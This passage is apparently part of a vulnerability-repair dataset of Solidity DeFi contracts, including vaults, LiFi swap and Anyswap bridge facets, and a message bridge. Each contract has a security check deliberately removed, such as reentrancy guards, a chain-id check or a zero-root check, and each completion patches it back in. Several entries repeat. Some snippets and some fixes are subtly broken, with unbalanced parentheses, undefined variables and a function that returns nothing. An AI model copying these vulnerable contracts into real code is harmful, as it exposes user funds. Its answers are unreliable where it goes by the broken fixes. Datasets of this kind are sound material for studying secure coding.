Approve `spender` to transfer up to `amount` from `src`\n116      * @dev This will overwrite the approval amount for `spender`\n117      *  and is subject to issues noted [here](https://eips.ethereum.org/EIPS/eip-20#approve)\n118      * @param spender The address of the account which may transfer tokens\n119      * @param amount The number of tokens that are approved (uint256.max means infinite)\n120      * @return Whether or not the approval succeeded\n121      */\n122     function approve(address spender, uint256 amount) override external returns (bool) {\n123         address src = msg.sender;\n124         transferAllowances[src][spender] = amount;\n125         emit Approval(src, spender, amount);\n126         return true;\n127     }\n128     /**\n129      * @notice Returns the current total borrows plus accrued interest\n130      * @return The total borrows with interest\n  \n131     /*** Safe Token ***/\n\n132     /**\n133      * @notice Gets balance of this contract in terms of the underlying\n134      * @dev This excludes the value of the current message, if any\n135      * @return The quantity of underlying owned by this contract\n136      */\n137     function getCashPrior() virtual internal view returns (uint);\n\n138     /**\n139      * @dev Performs a transfer in, reverting upon failure. Returns the amount actually transferred to the protocol, in case of a fee.\n140      *  This may revert due to insufficient balance or insufficient allowance.\n141      */\n142     function doTransferIn(address from, uint amount) virtual internal returns (uint);\n\n143     /**\n144      * @dev Performs a transfer out, ideally returning an explanatory error code upon failure rather than reverting.\n145      *  If caller has not called checked protocol's balance, may revert due to insufficient cash held in the contract.\n146      *  If caller has checked protocol's balance, and verified it is >= amount, this should not revert in normal conditions.\n147      */\n148     function doTransferOut(address payable to, uint amount) virtual internal;\n\n149 }",
        "completion": "23+   modifier nonReentrant() {\n        require(_notEntered, \"re-entered\");\n        _notEntered = false;\n        _;\n        _notEntered = true; // get a gas-refund post-Istanbul\n    }\n29 nonReentrant\n59 nonReentrant\n101 nonReentrant \n111 nonReentrant"
    },
    {
        "prompt": "1 // SPDX-License-Identifier: UNLICENSED\n2 pragma solidity =0.8.7;\n\n3 import \"./interfaces/ICollateral.sol\";\n4 import \"./interfaces/IStrategyController.sol\";\n5 import \"./interfaces/IHook.sol\";\n6 import \"@openzeppelin/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol\";\n7 import \"@openzeppelin/contracts-upgradeable/token/ERC20/IERC20Upgradeable.sol\";\n8 import \"@openzeppelin/contracts-upgradeable/token/ERC20/utils/SafeERC20Upgradeable.sol\";\n9 import \"@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol\";\n10 import \"@openzeppelin/contracts-upgradeable/security/ReentrancyGuardUpgradeable.sol\";\n\n11 contract Collateral is\n12     ICollateral,\n13     ERC20Upgradeable,\n14     OwnableUpgradeable,\n15     ReentrancyGuardUpgradeable\n16 {\n17     using SafeERC20Upgradeable for IERC20Upgradeable;\n\n18     bool private _depositsAllowed;\n19     bool private _withdrawalsAllowed;\n20     address private _treasury;\n21     uint256 private _mintingFee;\n22     uint256 private _redemptionFee;\n23     IERC20Upgradeable private _baseToken;\n24     IStrategyController private _strategyController;\n\n25     uint256 private _delayedWithdrawalExpiry;\n26     mapping(address => WithdrawalRequest) private _accountToWithdrawalRequest;\n\n27     IHook private _depositHook;\n28     IHook private _withdrawHook;\n\n29     uint256 private constant FEE_DENOMINATOR = 1000000;\n30     uint256 private constant FEE_LIMIT = 50000;\n\n31     function initialize(address _newBaseToken, address _newTreasury)\n32         public\n33         initializer\n34     {\n35         __Ownable_init_unchained();\n36         __ReentrancyGuard_init_unchained();\n37         __ERC20_init_unchained(\n38             string(\"prePO Collateral Token\"),\n39             string(\"preCT\")\n40         );\n41         _baseToken = IERC20Upgradeable(_newBaseToken);\n42         _treasury = _newTreasury;\n43     }\n\n44     function deposit(uint256 _amount)\n45         external\n46         override\n47         nonReentrant\n48         returns (uint256)\n49     {\n50         require(_depositsAllowed, \"Deposits not allowed\");\n51         _baseToken.safeTransferFrom(msg.sender, address(this), _amount);\n52         // Calculate fees and shares to mint including latent contract funds\n53         uint256 _amountToDeposit = _baseToken.balanceOf(address(this));\n54         // Record deposit before fee is taken\n55         if (address(_depositHook) != address(0)) {\n56             _depositHook.hook(msg.sender, _amount, _amountToDeposit);\n57         }\n58         /**\n59          * Add 1 to avoid rounding to zero, only process deposit if user is\n60          * depositing an amount large enough to pay a fee.\n61          */\n62         uint256 _fee = (_amountToDeposit * _mintingFee) / FEE_DENOMINATOR + 1;\n63         require(_amountToDeposit > _fee, \"Deposit amount too small\");\n64         _baseToken.safeTransfer(_treasury, _fee);\n65         _amountToDeposit -= _fee;\n\n66         uint256 _valueBefore = _strategyController.totalValue();\n67         _baseToken.approve(address(_strategyController), _amountToDeposit);\n68         _strategyController.deposit(_amountToDeposit);\n69         uint256 _valueAfter = _strategyController.totalValue();\n70         _amountToDeposit = _valueAfter - _valueBefore;\n\n71         uint256 _shares = 0;\n72         if (totalSupply() == 0) {\n73             _shares = _amountToDeposit;\n74         } else {\n75             /**\n76              * # of shares owed = amount deposited / cost per share, cost per\n77              * share = total supply / total value.\n78              */\n79             _shares = (_amountToDeposit * totalSupply()) / (_valueBefore);\n80         }\n81         _mint(msg.sender, _shares);\n82         return _shares;\n83     }\n\n84     function initiateWithdrawal(uint256 _amount) external override {\n85         /**\n86          * Checking the balance before initiation is necessary since a user\n87          * could initiate an unlimited withdrawal amount ahead of time,\n88          * negating the protection a delayed withdrawal offers.\n89          */\n90         require(balanceOf(msg.sender) >= _amount, \"Insufficient balance\");\n91         _accountToWithdrawalRequest[msg.sender].amount = _amount;\n92         _accountToWithdrawalRequest[msg.sender].blockNumber = block.number;\n93     }\n\n94     function uninitiateWithdrawal() external override {\n95         _accountToWithdrawalRequest[msg.sender].amount = 0;\n96         _accountToWithdrawalRequest[msg.sender].blockNumber = 0;\n97     }\n\n98     function _processDelayedWithdrawal(address _account, uint256 _amount)\n99         internal\n100     {\n101         /**\n102          * Verify that the withdrawal being processed matches what was\n103          * recorded during initiation.\n104          */\n105         require(\n106             _accountToWithdrawalRequest[_account].amount == _amount,\n107             \"Initiated amount does not match\"\n108         );\n109         uint256 _recordedBlock = _accountToWithdrawalRequest[_account]\n110             .blockNumber;\n111         require(\n112             _recordedBlock + _delayedWithdrawalExpiry >= block.number,\n113             \"Must withdraw before expiry\"\n114         );\n115         require(\n116             block.number > _recordedBlock,\n117             \"Must withdraw in a later block\"\n118         );\n119         // Reset the initiation prior to withdrawal.\n120         _accountToWithdrawalRequest[_account].amount = 0;\n121         _accountToWithdrawalRequest[_account].blockNumber = 0;\n122     }\n\n123     function withdraw(uint256 _amount)\n124         external\n125         override\n126         nonReentrant\n127         returns (uint256)\n128     {\n129         require(_withdrawalsAllowed, \"Withdrawals not allowed\");\n130         if (_delayedWithdrawalExpiry != 0) {\n131             _processDelayedWithdrawal(msg.sender, _amount);\n132         }\n133         uint256 _owed = (_strategyController.totalValue() * _amount) /\n134             totalSupply();\n135         _burn(msg.sender, _amount);\n\n136         uint256 _balanceBefore = _baseToken.balanceOf(address(this));\n137         _strategyController.withdraw(address(this), _owed);\n138         uint256 _balanceAfter = _baseToken.balanceOf(address(this));\n\n139         uint256 _amountWithdrawn = _balanceAfter - _balanceBefore;\n140         // Record withdrawal before fee is taken\n141         if (address(_withdrawHook) != address(0)) {\n142             _withdrawHook.hook(msg.sender, _amount, _amountWithdrawn);\n143         }\n\n144         /**\n145          * Send redemption fee to the protocol treasury. Add 1 to avoid\n146          * rounding to zero, only process withdrawal if user is\n147          * withdrawing an amount large enough to pay a fee.\n148          */\n149         uint256 _fee = (_amountWithdrawn * _redemptionFee) /\n150             FEE_DENOMINATOR +\n151             1;\n152         require(_amountWithdrawn > _fee, \"Withdrawal amount too small\");\n153         _baseToken.safeTransfer(_treasury, _fee);\n154         _amountWithdrawn -= _fee;\n155         _baseToken.safeTransfer(msg.sender, _amountWithdrawn);\n156         return _amountWithdrawn;\n157     }\n\n158     function setDepositsAllowed(bool _allowed) external override onlyOwner {\n159         _depositsAllowed = _allowed;\n160         emit DepositsAllowedChanged(_allowed);\n161     }\n\n162     function setWithdrawalsAllowed(bool _allowed) external override onlyOwner {\n163         _withdrawalsAllowed = _allowed;\n164         emit WithdrawalsAllowedChanged(_allowed);\n165     }\n\n166     function setStrategyController(IStrategyController _newStrategyController)\n167         external\n168         override\n169         onlyOwner\n170     {\n171         _strategyController = _newStrategyController;\n172         emit StrategyControllerChanged(address(_strategyController));\n173     }\n\n174     function setDelayedWithdrawalExpiry(uint256 _newDelayedWithdrawalExpiry)\n175         external\n176         override\n177         onlyOwner\n178     {\n179         _delayedWithdrawalExpiry = _newDelayedWithdrawalExpiry;\n180         emit DelayedWithdrawalExpiryChanged(_delayedWithdrawalExpiry);\n181     }\n\n182     function setMintingFee(uint256 _newMintingFee)\n183         external\n184         override\n185         onlyOwner\n186     {\n187         require(_newMintingFee <= FEE_LIMIT, \"Exceeds fee limit\");\n188         _mintingFee = _newMintingFee;\n189         emit MintingFeeChanged(_mintingFee);\n190     }\n\n191     function setRedemptionFee(uint256 _newRedemptionFee)\n192         external\n193         override\n194         onlyOwner\n195     {\n196         require(_newRedemptionFee <= FEE_LIMIT, \"Exceeds fee limit\");\n197         _redemptionFee = _newRedemptionFee;\n198         emit RedemptionFeeChanged(_redemptionFee);\n199     }\n\n200     function setDepositHook(IHook _newDepositHook)\n201         external\n202         override\n203         onlyOwner\n204     {\n205         _depositHook = _newDepositHook;\n206         emit DepositHookChanged(address(_depositHook));\n207     }\n\n208     function setWithdrawHook(IHook _newWithdrawHook)\n209         external\n210         override\n211         onlyOwner\n212     {\n213         _withdrawHook = _newWithdrawHook;\n214         emit WithdrawHookChanged(address(_withdrawHook));\n215     }\n\n216     function getDepositsAllowed() external view override returns (bool) {\n217         return _depositsAllowed;\n218     }\n\n219     function getWithdrawalsAllowed() external view override returns (bool) {\n220         return _withdrawalsAllowed;\n221     }\n\n222     function getTreasury() external view override returns (address) {\n223         return _treasury;\n224     }\n\n225     function getMintingFee() external view override returns (uint256) {\n226         return _mintingFee;\n227     }\n\n228     function getRedemptionFee() external view override returns (uint256) {\n229         return _redemptionFee;\n230     }\n\n231     function getBaseToken()\n232         external\n233         view\n234         override\n235         returns (IERC20Upgradeable)\n236     {\n237         return _baseToken;\n238     }\n\n239     function getStrategyController()\n240         external\n241         view\n242         override\n243         returns (IStrategyController)\n244     {\n245         return _strategyController;\n246     }\n\n247     function getDelayedWithdrawalExpiry()\n248         external\n249         view\n250         override\n251         returns (uint256)\n252     {\n253         return _delayedWithdrawalExpiry;\n254     }\n\n255     function getWithdrawalRequest(address _account)\n256         external\n257         view\n258         override\n259         returns (WithdrawalRequest memory)\n260     {\n261         return _accountToWithdrawalRequest[_account];\n262     }\n\n263     function getDepositHook() external view override returns (IHook) {\n264         return _depositHook;\n265     }\n\n266     function getWithdrawHook() external view override returns (IHook) {\n267         return _withdrawHook;\n268     }\n\n269     function getAmountForShares(uint256 _shares)\n270         external\n271         view\n272         override\n273         returns (uint256)\n274     {\n275         if (totalSupply() == 0) {\n276             return _shares;\n277         }\n278         return (_shares * totalAssets()) / totalSupply();\n279     }\n\n280     function getSharesForAmount(uint256 _amount)\n281         external\n282         view\n283         override\n284         returns (uint256)\n285     {\n286         uint256 _totalAssets = totalAssets();\n287     }\n\n288     function getFeeDenominator() external pure override returns (uint256) {\n289         return FEE_DENOMINATOR;\n290     }\n\n291     function getFeeLimit() external pure override returns (uint256) {\n292         return FEE_LIMIT;\n293     }\n\n294     function totalAssets() public view override returns (uint256) {\n295         return\n296             _baseToken.balanceOf(address(this)) +\n297             _strategyController.totalValue();\n298     }\n299 }\n",
        "completion": "286+ assert(totalAssets != 0);"
    },
    {
        "prompt": "1 // SPDX-License-Identifier: MIT\n2 pragma solidity ^0.8.7;\n\n3 import { ILiFi } from \"../Interfaces/ILiFi.sol\";\n4 import { LibAsset, IERC20 } from \"../Libraries/LibAsset.sol\";\n5 import \"./Swapper.sol\";\n\n6 /**\n7  * @title Generic Swap Facet\n8  * @author Li.Finance (https://li.finance)\n9  * @notice Provides functionality for swapping through ANY DEX\n10  * @dev Uses calldata to execute arbitrary methods on DEXs\n11  */\n12 contract GenericSwapFacet is ILiFi, Swapper {\n13     /* ========== Public Functions ========== */\n\n14     /**\n15      * @notice Performs a swap and that's it\n16      * @param _lifiData data used purely for tracking and analytics\n17      * @param _swapData an array of swap related data for performing swaps before bridging\n18      */\n19     function swapTokensGeneric(LiFiData memory _lifiData, LibSwap.SwapData[] calldata _swapData) public payable {\n20         uint256 receivingAssetIdBalance = LibAsset.getOwnBalance(_lifiData.receivingAssetId);\n\n21         // Swap\n22         _executeSwaps(_lifiData, _swapData);\n\n23         uint256 postSwapBalance = LibAsset.getOwnBalance(_lifiData.receivingAssetId) - receivingAssetIdBalance;\n\n24         LibAsset.transferAsset(_lifiData.receivingAssetId, payable(msg.sender), postSwapBalance);\n\n25         emit LiFiTransferStarted(\n26             _lifiData.transactionId,\n27             _lifiData.integrator,\n28             _lifiData.referrer,\n29             _lifiData.sendingAssetId,\n30             _lifiData.receivingAssetId,\n31             _lifiData.receiver,\n32             _lifiData.amount,\n33             _lifiData.destinationChainId,\n34             block.timestamp\n35         );\n36     }\n37 }",
        "completion": "20+ require(LibAsset.getOwnBalance(_swapData.receivingAssetId) - toAmount) > 0, \"No tokens received\");"
    },
    {
        "prompt": "1 // SPDX-License-Identifier: MIT\n2 pragma solidity ^0.8.7;\n\n3 import { ILiFi } from \"../Interfaces/ILiFi.sol\";\n4 import { IAnyswapRouter } from \"../Interfaces/IAnyswapRouter.sol\";\n5 import { LibDiamond } from \"../Libraries/LibDiamond.sol\";\n6 import { LibAsset, IERC20 } from \"../Libraries/LibAsset.sol\";\n7 import { IAnyswapToken } from \"../Interfaces/IAnyswapToken.sol\";\n8 import { LibDiamond } from \"../Libraries/LibDiamond.sol\";\n9 import \"./Swapper.sol\";\n\n10 /**\n11  * @title Anyswap Facet\n12  * @author Li.Finance (https://li.finance)\n13  * @notice Provides functionality for bridging through Multichain (Prev. AnySwap)\n14  */\n15 contract AnyswapFacet is ILiFi, Swapper {\n16     /* ========== Types ========== */\n\n17     struct AnyswapData {\n18         address token;\n19         address router;\n20         uint256 amount;\n21         address recipient;\n22         uint256 toChainId;\n23     }\n\n24     /* ========== Public Bridge Functions ========== */\n\n25     /**\n26      * @notice Bridges tokens via Anyswap\n27      * @param _lifiData data used purely for tracking and analytics\n28      * @param _anyswapData data specific to Anyswap\n29      */\n30     function startBridgeTokensViaAnyswap(LiFiData memory _lifiData, AnyswapData calldata _anyswapData) public payable {\n31         address underlyingToken = IAnyswapToken(_anyswapData.token).underlying();\n32         if (_anyswapData.token != address(0) && underlyingToken != IAnyswapRouter(_anyswapData.router).wNATIVE()) {\n33             if (underlyingToken == address(0)) {\n34                 underlyingToken = _anyswapData.token;\n35             }\n\n36             uint256 _fromTokenBalance = LibAsset.getOwnBalance(underlyingToken);\n37             LibAsset.transferFromERC20(underlyingToken, msg.sender, address(this), _anyswapData.amount);\n\n38             require(\n39                 LibAsset.getOwnBalance(underlyingToken) - _fromTokenBalance == _anyswapData.amount,\n40                 \"ERR_INVALID_AMOUNT\"\n41             );\n42         } else {\n43             require(msg.value == _anyswapData.amount, \"ERR_INVALID_AMOUNT\");\n44         }\n\n45         _startBridge(_anyswapData);\n\n46         emit LiFiTransferStarted(\n47             _lifiData.transactionId,\n48             _lifiData.integrator,\n49             _lifiData.referrer,\n50             _lifiData.sendingAssetId,\n51             _lifiData.receivingAssetId,\n52             _lifiData.receiver,\n53             _lifiData.amount,\n54             _lifiData.destinationChainId,\n55             block.timestamp\n56         );\n57     }\n\n58     /**\n59      * @notice Performs a swap before bridging via Anyswap\n60      * @param _lifiData data used purely for tracking and analytics\n61      * @param _swapData an array of swap related data for performing swaps before bridging\n62      * @param _anyswapData data specific to Anyswap\n63      */\n64     function swapAndStartBridgeTokensViaAnyswap(\n65         LiFiData memory _lifiData,\n66         LibSwap.SwapData[] calldata _swapData,\n67         AnyswapData memory _anyswapData\n68     ) public payable {\n69         address underlyingToken = IAnyswapToken(_anyswapData.token).underlying();\n70         if (_anyswapData.token != address(0) && underlyingToken != IAnyswapRouter(_anyswapData.router).wNATIVE()) {\n71             if (underlyingToken == address(0)) {\n72                 underlyingToken = _anyswapData.token;\n73             }\n\n74             uint256 _fromTokenBalance = LibAsset.getOwnBalance(underlyingToken);\n\n75             // Swap\n76             _executeSwaps(_lifiData, _swapData);\n\n77             uint256 _postSwapBalance = LibAsset.getOwnBalance(underlyingToken) - _fromTokenBalance;\n\n78             require(_postSwapBalance > 0, \"ERR_INVALID_AMOUNT\");\n\n79             _anyswapData.amount = _postSwapBalance;\n80         } else {\n81             uint256 _fromBalance = address(this).balance;\n\n82             // Swap\n83             _executeSwaps(_lifiData, _swapData);\n\n84             require(address(this).balance - _fromBalance >= _anyswapData.amount, \"ERR_INVALID_AMOUNT\");\n\n85             uint256 _postSwapBalance = address(this).balance - _fromBalance;\n\n86             require(_postSwapBalance > 0, \"ERR_INVALID_AMOUNT\");\n\n87             _anyswapData.amount = _postSwapBalance;\n88         }\n\n89         _startBridge(_anyswapData);\n\n90         emit LiFiTransferStarted(\n91             _lifiData.transactionId,\n92             _lifiData.integrator,\n93             _lifiData.referrer,\n94             _lifiData.sendingAssetId,\n95             _lifiData.receivingAssetId,\n96             _lifiData.receiver,\n97             _lifiData.amount,\n98             _lifiData.destinationChainId,\n99             block.timestamp\n100         );\n101     }\n\n102     /* ========== Internal Functions ========== */\n\n103     /**\n104      * @dev Conatains the business logic for the bridge via Anyswap\n105      * @param _anyswapData data specific to Anyswap\n106      */\n107     function _startBridge(AnyswapData memory _anyswapData) internal {\n108         // Check chain id\n109         require(block.chainid != _anyswapData.toChainId, \"Cannot bridge to the same network.\");\n110         address underlyingToken = IAnyswapToken(_anyswapData.token).underlying();\n\n111         if (underlyingToken == IAnyswapRouter(_anyswapData.router).wNATIVE()) {\n112             IAnyswapRouter(_anyswapData.router).anySwapOutNative{ value: _anyswapData.amount }(\n113                 _anyswapData.token,\n114                 _anyswapData.recipient,\n115                 _anyswapData.toChainId\n116             );\n117             return;\n118         }\n\n119         if (_anyswapData.token != address(0)) {\n120             // Has underlying token?\n121             if (underlyingToken != address(0)) {\n122                 // Give Anyswap approval to bridge tokens\n123                 LibAsset.approveERC20(IERC20(underlyingToken), _anyswapData.router, _anyswapData.amount);\n\n124                 IAnyswapRouter(_anyswapData.router).anySwapOutUnderlying(\n125                     _anyswapData.token,\n126                     _anyswapData.recipient,\n127                     _anyswapData.amount,\n128                     _anyswapData.toChainId\n129                 );\n130             } else {\n131                 // Give Anyswap approval to bridge tokens\n132                 LibAsset.approveERC20(IERC20(_anyswapData.token), _anyswapData.router, _anyswapData.amount);\n\n133                 IAnyswapRouter(_anyswapData.router).anySwapOut(\n134                     _anyswapData.token,\n135                     _anyswapData.recipient,\n136                     _anyswapData.amount,\n137                     _anyswapData.toChainId\n138                 );\n139             }\n140         }\n141     }\n142 }",
        "completion": "38             require(LibAsset.getOwnBalance(underlyingToken) - _fromTokenBalance == _anyswapData.amount, \"ERR_INVALID_AMOUNT\" );\n43             require(msg.value == _anyswapData.amount, \"ERR_INVALID_AMOUNT\");\n78             require(_postSwapBalance > 0, \"ERR_INVALID_AMOUNT\");\n84             require(address(this).balance - _fromBalance >= _anyswapData.amount, \"ERR_INVALID_AMOUNT\");\n86             require(_postSwapBalance > 0, \"ERR_INVALID_AMOUNT\");\n109         require(block.chainid != _anyswapData.toChainId, \"Cannot bridge to the same network.\");"
    },
    {
        "prompt": "1 // SPDX-License-Identifier: MIT\n2 pragma solidity ^0.8.7;\n\n3 import { ILiFi } from \"../Interfaces/ILiFi.sol\";\n4 import { IAnyswapRouter } from \"../Interfaces/IAnyswapRouter.sol\";\n5 import { LibDiamond } from \"../Libraries/LibDiamond.sol\";\n6 import { LibAsset, IERC20 } from \"../Libraries/LibAsset.sol\";\n7 import { IAnyswapToken } from \"../Interfaces/IAnyswapToken.sol\";\n8 import { LibDiamond } from \"../Libraries/LibDiamond.sol\";\n9 import \"./Swapper.sol\";\n\n10 /**\n11  * @title Anyswap Facet\n12  * @author Li.Finance (https://li.finance)\n13  * @notice Provides functionality for bridging through Multichain (Prev. AnySwap)\n14  */\n15 contract AnyswapFacet is ILiFi, Swapper {\n16     /* ========== Types ========== */\n\n17     struct AnyswapData {\n18         address token;\n19         address router;\n20         uint256 amount;\n21         address recipient;\n22         uint256 toChainId;\n23     }\n\n24     /* ========== Public Bridge Functions ========== */\n\n25     /**\n26      * @notice Bridges tokens via Anyswap\n27      * @param _lifiData data used purely for tracking and analytics\n28      * @param _anyswapData data specific to Anyswap\n29      */\n30     function startBridgeTokensViaAnyswap(LiFiData memory _lifiData, AnyswapData calldata _anyswapData) public payable {\n31         address underlyingToken = IAnyswapToken(_anyswapData.token).underlying();\n32         if (_anyswapData.token != address(0) && underlyingToken != IAnyswapRouter(_anyswapData.router).wNATIVE()) {\n33             if (underlyingToken == address(0)) {\n34                 underlyingToken = _anyswapData.token;\n35             }\n\n36             uint256 _fromTokenBalance = LibAsset.getOwnBalance(underlyingToken);\n37             LibAsset.transferFromERC20(underlyingToken, msg.sender, address(this), _anyswapData.amount);\n\n38             require(\n39                 LibAsset.getOwnBalance(underlyingToken) - _fromTokenBalance == _anyswapData.amount,\n40                 \"ERR_INVALID_AMOUNT\"\n41             );\n42         } else {\n43             require(msg.value == _anyswapData.amount, \"ERR_INVALID_AMOUNT\");\n44         }\n\n45         _startBridge(_anyswapData);\n\n46         emit LiFiTransferStarted(\n47             _lifiData.transactionId,\n48             _lifiData.integrator,\n49             _lifiData.referrer,\n50             _lifiData.sendingAssetId,\n51             _lifiData.receivingAssetId,\n52             _lifiData.receiver,\n53             _lifiData.amount,\n54             _lifiData.destinationChainId,\n55             block.timestamp\n56         );\n57     }\n\n58     /**\n59      * @notice Performs a swap before bridging via Anyswap\n60      * @param _lifiData data used purely for tracking and analytics\n61      * @param _swapData an array of swap related data for performing swaps before bridging\n62      * @param _anyswapData data specific to Anyswap\n63      */\n64     function swapAndStartBridgeTokensViaAnyswap(\n65         LiFiData memory _lifiData,\n66         LibSwap.SwapData[] calldata _swapData,\n67         AnyswapData memory _anyswapData\n68     ) public payable {\n69         address underlyingToken = IAnyswapToken(_anyswapData.token).underlying();\n70         if (_anyswapData.token != address(0) && underlyingToken != IAnyswapRouter(_anyswapData.router).wNATIVE()) {\n71             if (underlyingToken == address(0)) {\n72                 underlyingToken = _anyswapData.token;\n73             }\n\n74             uint256 _fromTokenBalance = LibAsset.getOwnBalance(underlyingToken);\n\n75             // Swap\n76             _executeSwaps(_lifiData, _swapData);\n\n77             uint256 _postSwapBalance = LibAsset.getOwnBalance(underlyingToken) - _fromTokenBalance;\n\n78             require(_postSwapBalance > 0, \"ERR_INVALID_AMOUNT\");\n\n79             _anyswapData.amount = _postSwapBalance;\n80         } else {\n81             uint256 _fromBalance = address(this).balance;\n\n82             // Swap\n83             _executeSwaps(_lifiData, _swapData);\n\n84             require(address(this).balance - _fromBalance >= _anyswapData.amount, \"ERR_INVALID_AMOUNT\");\n\n85             uint256 _postSwapBalance = address(this).balance - _fromBalance;\n\n86             require(_postSwapBalance > 0, \"ERR_INVALID_AMOUNT\");\n\n87             _anyswapData.amount = _postSwapBalance;\n88         }\n\n89         _startBridge(_anyswapData);\n\n90         emit LiFiTransferStarted(\n91             _lifiData.transactionId,\n92             _lifiData.integrator,\n93             _lifiData.referrer,\n94             _lifiData.sendingAssetId,\n95             _lifiData.receivingAssetId,\n96             _lifiData.receiver,\n97             _lifiData.amount,\n98             _lifiData.destinationChainId,\n99             block.timestamp\n100         );\n101     }\n\n102     /* ========== Internal Functions ========== */\n\n103     /**\n104      * @dev Conatains the business logic for the bridge via Anyswap\n105      * @param _anyswapData data specific to Anyswap\n106      */\n107     function _startBridge(AnyswapData memory _anyswapData) internal {\n108         // Check chain id\n109         address underlyingToken = IAnyswapToken(_anyswapData.token).underlying();\n\n110         if (underlyingToken == IAnyswapRouter(_anyswapData.router).wNATIVE()) {\n111             IAnyswapRouter(_anyswapData.router).anySwapOutNative{ value: _anyswapData.amount }(\n112                 _anyswapData.token,\n113                 _anyswapData.recipient,\n114                 _anyswapData.toChainId\n115             );\n116             return;\n117         }\n\n118         if (_anyswapData.token != address(0)) {\n119             // Has underlying token?\n120             if (underlyingToken != address(0)) {\n121                 // Give Anyswap approval to bridge tokens\n122                 LibAsset.approveERC20(IERC20(underlyingToken), _anyswapData.router, _anyswapData.amount);\n\n123                 IAnyswapRouter(_anyswapData.router).anySwapOutUnderlying(\n124                     _anyswapData.token,\n125                     _anyswapData.recipient,\n126                     _anyswapData.amount,\n127                     _anyswapData.toChainId\n128                 );\n129             } else {\n130                 // Give Anyswap approval to bridge tokens\n131                 LibAsset.approveERC20(IERC20(_anyswapData.token), _anyswapData.router, _anyswapData.amount);\n\n132                 IAnyswapRouter(_anyswapData.router).anySwapOut(\n133                     _anyswapData.token,\n134                     _anyswapData.recipient,\n135                     _anyswapData.amount,\n136                     _anyswapData.toChainId\n137                 );\n138             }\n139         }\n140     }\n141 }",
        "completion": "38             require(LibAsset.getOwnBalance(underlyingToken) - _fromTokenBalance == _anyswapData.amount, \"ERR_INVALID_AMOUNT\" );\n43             require(msg.value == _anyswapData.amount, \"ERR_INVALID_AMOUNT\");\n78             require(_postSwapBalance > 0, \"ERR_INVALID_AMOUNT\");\n84             require(address(this).balance - _fromBalance >= _anyswapData.amount, \"ERR_INVALID_AMOUNT\");\n86             require(_postSwapBalance > 0, \"ERR_INVALID_AMOUNT\");\n109+  require(block.chainid != _anyswapData.toChainId, \"Cannot bridge to the same network.\");"
    },
    {
        "prompt": "1 abstract contract BaseVault {\n\n2     DepositQueueLib DepositQueue;\n\n3     function processQueuedDeposits(uint256 startIndex, uint256 endIndex) external {\n4         uint256 _totalAssets = totalAssets();\n5         for (uint256 i = startIndex; i < endIndex; i++){\n6             uint256 currentAssets = _totalAssets + processedDeposits;\n7             depositEntry = depositQueue.get(i);\n8             processedDeposits += depositEntry.amount;\n9         }\n10         depositQueue.remove(startIndex, endIndex);\n11     }",
        "completion": "9+ require(depositQueue.size()==1, \"Cannot process multiple deposits\");\n"
    },
    {
        "prompt": "1 abstract contract BaseVault {\n\n2     DepositQueueLib DepositQueue;\n\n3     function processQueuedDeposits(uint256 startIndex, uint256 endIndex) external {\n4         uint256 _totalAssets = totalAssets();\n5         for (uint256 i = startIndex; i < endIndex; i++){\n6             uint256 currentAssets = _totalAssets + processedDeposits;\n7             depositEntry = depositQueue.get(i);\n8             processedDeposits += depositEntry.amount;\n9         }\n10         depositQueue.remove(startIndex, endIndex);\n11     }",
        "completion": "9+ require(depositQueue.size()==1, \"Cannot process multiple deposits\");\n"
    },
    {
        "prompt": "1 contract Bridge {\n2   function init(\n3     uint32 _callSite,\n4     address _sender,\n5     bytes32 _merkleRoot\n6      ) public {\n7         base_initialize(_sender);\n8         callSite = _callSite;\n9         committedRoot = _merkleRoot;\n10         confirmAt[_merkleRoot] = 1;\n11      }\n\n\n12  function process(bytes memory _message) \n13     public returns (bool _success) {\n14     assert(accept(messages[_msgHash]));\n15     }\n    \n16   function accept(bytes32 _root) \n17     public view returns (bool) {\n18     uint256 _time = confirmAt[_root];\n19      }",
        "completion": "9+  assert(_merkleRoot != 0);\n17+ assert(_msgHash != 0);\n18+ assert(_root != 0);"
    },
    {
        "prompt": "1 contract Bridge {\n2   function init(\n3     uint32 _callSite,\n4     address _sender,\n5     bytes32 _merkleRoot\n6      ) public {\n7         base_initialize(_sender);\n8         callSite = _callSite;\n9         committedRoot = _merkleRoot;\n10         confirmAt[_merkleRoot] = 1;\n11      }\n\n\n12  function process(bytes memory _message) \n13     public returns (bool _success) {\n14     assert(accept(messages[_msgHash]));\n15     }\n    \n16   function accept(bytes32 _root) \n17     public view returns (bool) {\n18     uint256 _time = confirmAt[_root];\n19      }",
        "completion": "9+  assert(_merkleRoot != 0);\n17+ assert(_msgHash != 0);\n18+ assert(_root != 0);"
    },
    {
        "prompt": "1     function _stETHTransferFrom(address from, address to, uint256 amount) internal returns () {      \n2         _asset.safeTransferFrom(from, to, amount);\n3       }\n4     }\n\n5     function _beforeWithdraw(uint256 shares) internal {\n6         lastRoundAssets -= shares.mulDivDown(lastSharePrice);\n      \n7     }",
        "completion": "1+ require(amount > 0);\n6+ assert(lastRoundAssets > 0);"
    },
    {
        "prompt": "1     function _stETHTransferFrom(address from, address to, uint256 amount) internal returns () {      \n2         _asset.safeTransferFrom(from, to, amount);\n3       }\n4     }\n\n5     function _beforeWithdraw(uint256 shares) internal {\n6         lastRoundAssets -= shares.mulDivDown(lastSharePrice);\n      \n7     }",
        "completion": "1+ require(amount > 0);\n6+ assert(lastRoundAssets > 0);"
    }
]